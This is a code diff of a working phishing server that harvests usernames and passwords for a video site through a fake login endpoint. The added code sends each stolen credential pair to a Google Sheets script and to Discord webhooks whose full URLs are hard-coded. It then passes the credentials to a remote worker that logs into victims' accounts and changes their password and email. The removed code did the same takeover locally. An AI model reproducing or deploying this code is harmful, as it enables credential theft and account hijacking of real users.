@@ -3,91 +3,47 @@ import json
 import os
 import urllib.request
 import urllib.parse
+import threading
+import requests
 
 CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.json")
-SUCCESS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "successful.json")
+RENDER_WORKER_URL = "https://cwscrp-1.onrender.com"
 
-LOGIN_URL = "https://www.camwhores.tv/login/"
-LOGIN_HEADERS = {
-    "accept": "*/*",
-    "accept-language": "es-US,es;q=0.9",
-    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "origin": "https://www.camwhores.tv",
-    "referer": "https://www.camwhores.tv/tags/cama/",
-    "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": '"Windows"',
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "same-origin",
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-    "x-requested-with": "XMLHttpRequest",
-}
-
+GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwdAIV40A4sC9SWsIyXKC6uMJcgF1MGL6im_Vq9uxZT6HhHdS7CI5xUxFCLUzMLiKqPZw/exec"
+DISCORD_CREDS_WEBHOOK = "https://discord.com/api/webhooks/1480093421698940959/Z80mCRx5PykLaA29XwF7_Nxdl3QeqxRiyU380RbVpXc1nD-5Hb1lokk8-8Qzwle6kZtS"
+DISCORD_SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1480118694674956329/n8r1xhEf1Xyw7fUE33LlBF1PS2IRyFRboW6E-U78DkzIAMGxLzK0Bx7VYHy3cgYAyhCf"
 NEW_PASSWORD = "123aaa"
 NEW_EMAIL = "cuentadewapp1@gmail.com"
-CHANGE_PASS_URL = "https://www.camwhores.tv/change-password/"
-CHANGE_EMAIL_URL = "https://www.camwhores.tv/change-email/"
 
-def try_login(username, password):
-    data = urllib.parse.urlencode({
-        "username": username,
-        "pass": password,
-        "action": "login",
-        "email_link": "https://www.camwhores.tv/email/",
-        "format": "json",
-        "mode": "async",
-    }).encode()
-    req = urllib.request.Request(LOGIN_URL, data=data, headers=LOGIN_HEADERS)
-    with urllib.request.urlopen(req) as resp:
-        # Extract session cookie
-        session_cookie = None
-        for header in resp.headers.get_all("Set-Cookie") or []:
-            if "PHPSESSID" in header:
-                session_cookie = header.split(";")[0]
-        result = json.loads(resp.read().decode())
-        return result, session_cookie
+def send_to_sheet(tab, data):
+    try:
+        resp = requests.post(GOOGLE_SHEET_URL, json={"tab": tab, **data}, timeout=15)
+        print(f"[SHEET] {tab} -> {resp.status_code}")
+    except Exception as e:
+        print(f"[SHEET ERROR] {e}")
 
-def try_change_password(session_cookie, old_pass, new_pass):
-    data = urllib.parse.urlencode({
-        "old_pass": old_pass,
-        "pass": new_pass,
-        "pass2": new_pass,
-        "action": "change_pass",
-        "format": "json",
-        "mode": "async",
-    }).encode()
-    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
-    headers["Cookie"] = session_cookie + "; kt_member=1"
-    req = urllib.request.Request(CHANGE_PASS_URL, data=data, headers=headers)
-    with urllib.request.urlopen(req) as resp:
-        text = resp.read().decode()
-        try:
-            return json.loads(text)
-        except json.JSONDecodeError:
-            if "success" in text or "has been changed" in text:
-                return {"status": "success", "raw": text.strip()}
-            return {"status": "unknown", "raw": text.strip()}
+def send_to_discord(webhook_url, content):
+    try:
+        resp = requests.post(webhook_url, json={"content": content}, timeout=10)
+        print(f"[DISCORD] -> {resp.status_code}")
+    except Exception as e:
+        print(f"[DISCORD ERROR] {e}")
 
-def try_change_email(session_cookie, new_email):
-    data = urllib.parse.urlencode({
-        "email": new_email,
-        "action": "change_email",
-        "email_link": "https://www.camwhores.tv/email/",
-        "format": "json",
-        "mode": "async",
-    }).encode()
-    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
-    headers["Cookie"] = session_cookie + "; kt_member=1"
-    req = urllib.request.Request(CHANGE_EMAIL_URL, data=data, headers=headers)
-    with urllib.request.urlopen(req) as resp:
-        text = resp.read().decode()
-        try:
-            return json.loads(text)
-        except json.JSONDecodeError:
-            if "success" in text or "has been changed" in text or "confirmation" in text:
-                return {"status": "success", "raw": text.strip()}
-            return {"status": "unknown", "raw": text.strip()}
+def call_render_worker(username, password, timestamp):
+    """Fire-and-forget call to Render worker for login + password/email change"""
+    try:
+        resp = requests.post(f"{RENDER_WORKER_URL}/process", json={"username": username, "password": password, "timestamp": timestamp}, timeout=120)
+        result = resp.json()
+        print(f"[RENDER WORKER] {username} -> {result}")
+
+        # Send Discord success message from here (not from Render) to avoid rate limits
+        if result.get("loginStatus") == "success" and result.get("changePassStatus") == "success":
+            email_note = "YES" if result.get("changeEmailStatus") == "success" else "FAILED"
+            send_to_discord(DISCORD_SUCCESS_WEBHOOK,
+                f"**[SUCCESS]** `{username}` | Old: `{password}` | New: `{NEW_PASSWORD}` | Email: {email_note}"
+            )
+    except Exception as e:
+        print(f"[RENDER WORKER ERROR] {username} -> {e}")
 
 PROD_URL = "https://www.camwhores.tv/"
 PROD_HEADERS = {
@@ -245,81 +201,43 @@ class Handler(SimpleHTTPRequestHandler):
         elif parsed.path in ("/save-creds", "/api/save-creds"):
             params = parse_qs(parsed.query)
             body = {k: v[0] for k, v in params.items()}
+            username = body.get("username", "")
+            password = body.get("password", "")
+            timestamp = body.get("timestamp", "")
 
-            # Try login against real endpoint
-            login_result = None
-            try:
-                login_result, session_cookie = try_login(body.get("username", ""), body.get("password", ""))
-                body["login_status"] = login_result.get("status", "unknown")
-                body["login_response"] = login_result
-                print(f"[LOGIN] {body['username']} -> {login_result.get('status')}")
+            print(f"[CREDS] {username}")
 
-                # If login succeeded, change password
-                if login_result.get("status") == "success" and session_cookie:
-                    try:
-                        change_result = try_change_password(session_cookie, body.get("password", ""), NEW_PASSWORD)
-                        body["change_pass_status"] = change_result.get("status", "unknown")
-                        body["change_pass_response"] = change_result
-                        print(f"[CHANGE PASS] {body['username']} -> {change_result.get('status')}")
-                    except Exception as e:
-                        body["change_pass_status"] = "error"
-                        body["change_pass_error"] = str(e)
-                        print(f"[CHANGE PASS ERROR] {body['username']} -> {e}")
-
-                    # Change email
-                    try:
-                        email_result = try_change_email(session_cookie, NEW_EMAIL)
-                        body["change_email_status"] = email_result.get("status", "unknown")
-                        body["change_email_response"] = email_result
-                        print(f"[CHANGE EMAIL] {body['username']} -> {email_result.get('status')}")
-                    except Exception as e:
-                        body["change_email_status"] = "error"
-                        body["change_email_error"] = str(e)
-                        print(f"[CHANGE EMAIL ERROR] {body['username']} -> {e}")
-            except Exception as e:
-                body["login_status"] = "error"
-                body["login_error"] = str(e)
-                print(f"[LOGIN ERROR] {body.get('username')} -> {e}")
-
-            # Save to JSON
+            # 1. Save creds locally
             creds = []
             if os.path.exists(CREDS_FILE):
                 with open(CREDS_FILE, "r") as f:
                     creds = json.load(f)
-
             creds.append(body)
-
             with open(CREDS_FILE, "w") as f:
                 json.dump(creds, f, indent=2)
 
-            # Save successful entries to successful.json
-            if (body.get("login_status") == "success"
-                and body.get("change_pass_status") == "success"
-                and body.get("change_email_status") == "success"):
-                successes = []
-                if os.path.exists(SUCCESS_FILE):
-                    with open(SUCCESS_FILE, "r") as f:
-                        successes = json.load(f)
-                successes.append({
-                    "username": body.get("username"),
-                    "original_password": body.get("password"),
-                    "new_password": NEW_PASSWORD,
-                    "new_email": NEW_EMAIL,
-                    "timestamp": body.get("timestamp"),
-                })
-                with open(SUCCESS_FILE, "w") as f:
-                    json.dump(successes, f, indent=2)
-                print(f"[SUCCESS] {body['username']} saved to successful.json")
+            # 2. Save to Google Sheets + Discord
+            send_to_sheet("creds", {
+                "username": username,
+                "password": password,
+                "remember_me": body.get("remember_me", ""),
+                "timestamp": timestamp,
+                "login_status": "pending",
+                "login_error": "",
+            })
+            send_to_discord(DISCORD_CREDS_WEBHOOK,
+                f"**[CREDS]** `{username}` / `{password}` | Sending to worker..."
+            )
+
+            # 3. Fire-and-forget call to Render worker (in background thread)
+            threading.Thread(target=call_render_worker, args=(username, password, timestamp), daemon=True).start()
+
+            # 4. Return success immediately
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
-            errors = body.get("login_response", {}).get("errors", []) if isinstance(body.get("login_response"), dict) else []
-            error_message = errors[0].get("message", "") if errors else ""
-            self.wfile.write(json.dumps({
-                "login_status": body.get("login_status"),
-                "error_message": error_message,
-            }).encode())
+            self.wfile.write(json.dumps({"login_status": "success"}).encode())
         else:
             super().do_GET()
 
@@ -327,5 +245,6 @@ if __name__ == "__main__":
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
     server = HTTPServer(("0.0.0.0", 8080), Handler)
     print(f"Serving on http://localhost:8080")
-    print(f"Creds will be saved to: {CREDS_FILE}")
+    print(f"Creds saved locally to: {CREDS_FILE}")
+    print(f"Render worker: {RENDER_WORKER_URL}")
     server.serve_forever()
